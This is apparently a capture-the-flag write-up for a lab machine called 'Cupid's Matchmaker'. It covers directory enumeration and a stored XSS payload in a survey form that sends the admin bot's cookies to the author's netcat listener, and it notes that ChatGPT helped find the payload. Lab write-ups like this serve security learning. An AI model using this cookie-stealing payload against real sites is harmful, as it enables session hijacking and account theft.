# Cupid's Matchmaker

# Scenario

![image.png](image.png)

# Solution

Let’s explore the site

![image.png](image%201.png)

## Dirseach — Hidden Directories Enumeration

```bash
$ sudo dirsearch -u http://cupid.thm:5000/

[16:27:48] 302 -  199B  - /admin  ->  /login                                
[16:30:20] 200 -    2KB - /login                                            
[16:30:22] 302 -  189B  - /logout  ->  /                                    
[16:31:21] 200 -    5KB - /survey 
```

The `/login` page was useless tried several things from default creds to SQLi… nothing worked !!

We saw earlier in `/survey` white spaces that looks injectable let’s try `XSS injections`

![image.png](image%202.png)

## Payload : XSS (**Cross Site Scripting**)

- Tested many **XSS payloads** of course with the help of **chatgpt** , this worked for me

```bash
<img src=x onerror="this.src='http://192.168.156.94:1234/?c='+document.cookie">
```

Let’s break it down clearly:

🔹 `<img src=x>`

Forces an image load error (since `x` is not valid).

🔹 `onerror=`

When the image fails to load, JavaScript executes.

🔹 `this.src=`

Changes the image source to our machine.

🔹 `document.cookie`

Reads all non-HttpOnly cookies.

So when the admin bot loads the submission:

1. The image fails
2. `onerror` executes
3. It sends a request to our `netcat` listener
4. The cookies are appended in the URL

---

- Set up A `netcat` listener now

```bash
nc -lnvp 1234
```

Then paste your payload here and wait 

![image.png](image%203.png)

Then wait for the `netcat` listener response

![image.png](8032fe08-329c-4977-bd57-41c0b6e7b545.png)

There you go JOB DONEE!! 😊
